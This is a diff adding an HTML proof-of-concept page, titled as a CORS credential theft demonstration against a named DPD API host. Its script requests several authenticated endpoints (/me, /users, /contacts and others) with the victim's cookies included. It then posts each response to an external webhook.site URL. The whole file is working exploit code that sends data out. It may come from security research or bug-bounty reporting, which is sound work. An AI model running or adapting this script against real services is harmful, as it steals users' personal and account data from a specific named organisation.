@@ -1,0 +1,19 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>DPD CORS Credential Theft PoC</title>
+<script>
+(async () => {
+  const base = "https://api.q1-ai-connections.dpdgroup.co.uk";
+  const targets = ["/", "/me", "/users", "/contacts", "/configs/applications", "/notifications"];
+  for (const p of targets) {
+    try {
+      const r = await fetch(base + p, { method: "GET", credentials: "include" }); // includes victim cookies
+      const text = await r.text();
+      await fetch("https://webhook.site/62044503-69ff-4dd2-b786-e6d0af124046/?ep=" + encodeURIComponent(p) + "&st=" + r.status, {
+        method: "POST", mode: "no-cors", body: text.slice(0, 2000)
+      });
+      console.log(p, r.status, text.slice(0, 180));
+    } catch (e) { console.log("ERR", p, e); }
+  }
+})();
+</script>
